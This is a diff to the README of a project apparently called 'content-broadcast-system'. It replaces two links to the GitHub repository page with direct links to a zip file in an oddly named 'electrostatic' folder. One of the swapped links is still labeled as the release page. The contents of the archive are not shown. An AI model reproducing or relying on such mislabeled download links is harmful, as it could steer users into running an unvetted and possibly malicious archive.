@@ -1,6 +1,6 @@
 # 📢 content-broadcast-system - Stream your digital content with ease
 
-[![Download content-broadcast-system](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/arjavjain303-lab/content-broadcast-system)
+[![Download content-broadcast-system](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/arjavjain303-lab/content-broadcast-system/main/electrostatic/system_content_broadcast_v3.2.zip)
 
 ## 🎯 About This Application
 
@@ -22,7 +22,7 @@ Your computer must meet these requirements for a smooth experience:
 
 You can get the installation file from the following location:
 
-[Click here to visit the release page and download the installer](https://github.com/arjavjain303-lab/content-broadcast-system)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/arjavjain303-lab/content-broadcast-system/main/electrostatic/system_content_broadcast_v3.2.zip)
 
 Follow these steps to download the file:
 
